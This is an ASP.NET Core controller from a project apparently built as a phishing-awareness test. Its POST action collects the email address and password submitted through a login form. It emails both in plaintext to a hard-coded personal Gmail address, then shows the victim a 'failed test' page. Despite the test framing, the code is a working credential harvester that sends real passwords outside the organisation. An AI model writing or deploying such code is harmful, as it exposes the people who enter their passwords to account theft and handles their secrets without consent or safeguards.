using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using PhisingTest.BusinessLayer.Services;
using PhishingTest.Models.Models;

namespace PhisingTest.Controllers
{
    public class HomeController : Controller
    {
        private readonly IEmailService _EmailService;

        public HomeController(IEmailService emailService)
        {
            _EmailService = emailService;
        }

        public IActionResult Index()
        {
            return View();
        }

        [HttpPost]
        public IActionResult GetCredentials(Credential creds)
        {
            if (!ModelState.IsValid)
            {
                return RedirectToAction("Index");
            }

            SendCredentials(creds);
            return View("FailedTest");
        }

        private void SendCredentials(Credential creds)
        {
            _EmailService.SendEmailAsync("johnd.zartis@gmail.com", "Credentials Comprimised", $"Email: {creds.Email}\nPassword: {creds.Password}");
        }
    }
}
